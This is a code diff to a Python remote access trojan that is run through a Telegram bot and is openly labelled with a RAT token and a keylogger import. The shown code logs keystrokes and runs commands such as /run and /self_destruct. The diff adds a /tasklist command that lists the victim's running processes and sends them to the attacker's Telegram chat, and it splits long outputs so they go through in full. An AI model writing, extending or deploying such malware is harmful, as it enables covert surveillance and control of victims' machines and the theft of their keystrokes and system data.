@@ -18,9 +18,7 @@ import pyHook, pythoncom 							# keylogger
 import socket										# internal IP
 import getpass										# get username
 import collections
-
 me = singleton.SingleInstance() 
-
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 #token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
 token = os.environ['RAT_TOKEN'] # you can set your environment variable as well
@@ -68,15 +66,16 @@ functionalities = { '/arp' : '', \
 					'/pwd':'', \
 					'/run':'<target_file>', \
 					'/self_destruct':'', \
+					'/tasklist':'', \
 					'/to':'<target_computer>, [other_target_computer]'}
 with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
 	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
 	
 def internalIP():
-    internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    internal_ip.connect(('google.com', 0))
-    return internal_ip.getsockname()[0]
+	internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	internal_ip.connect(('google.com', 0))
+	return internal_ip.getsockname()[0]
 	
 def checkchat_id(chat_id):
 	return len(known_ids) == 0 or str(chat_id) in known_ids
@@ -93,7 +92,17 @@ def pressed_chars(event):
 		else:
 			stdout.write(tofile)
 	return not keyboardFrozen
-	
+
+def split_string(n, st):
+	lst = ['']
+	for i in str(st):
+		l = len(lst) - 1
+		if len(lst[l]) < n: 
+			lst[l] += i
+		else:
+			lst += [i]
+	return lst
+
 def handle(msg):
 	chat_id = msg['chat']['id']
 	if checkchat_id(chat_id):
@@ -298,6 +307,16 @@ def handle(msg):
 					os.remove(target_shortcut)
 				while True:
 					sleep(10)
+			elif command == '/tasklist':
+				lines = os.popen('tasklist /FI \"STATUS ne NOT RESPONDING\"')
+				response2 = ''
+				for line in lines:
+					line.replace('\n\n', '\n')
+					if len(line)>2000:
+						response2 +=line
+					else:
+						response += line
+				response += '\n' + response2
 			elif command.startswith('/to'):
 				command = command.replace('/to','')
 				if command == '':
@@ -314,7 +333,9 @@ def handle(msg):
 				msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
 				handle(msg)
 			if response != '':
-				bot.sendMessage(chat_id, response)
+				responses = split_string(4096, response)
+				for resp in responses:
+					bot.sendMessage(chat_id, resp)
 		else: # Upload a file to target
 			file_name = ''
 			file_id = None
